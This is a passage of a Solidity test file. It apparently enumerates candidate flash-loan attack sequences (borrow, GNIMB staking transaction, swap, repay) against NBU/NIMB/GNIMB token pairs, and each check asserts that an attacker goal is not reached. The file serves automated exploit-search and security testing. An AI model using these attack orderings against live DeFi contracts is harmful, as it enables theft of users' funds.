        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand242(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand243(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand244(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand245(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand246(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand247(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand248(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand249(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand250(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand251(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand252(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand253(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand254(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand255(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand256(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand257(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand258(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand259(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand260(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand261(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand262(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand263(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand264(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand265(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand266(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand267(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand268(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nbu(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand269(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand270(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand271(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nbu(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand272(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand273(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand274(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand275(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand276(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand277(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand278(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand279(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand280(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand281(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand282(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand283(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand284(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand285(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand286(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand287(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand288(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand289(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand290(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand291(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand292(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand293(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand294(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand295(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand296(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand297(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand298(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand299(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand300(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand301(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand302(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
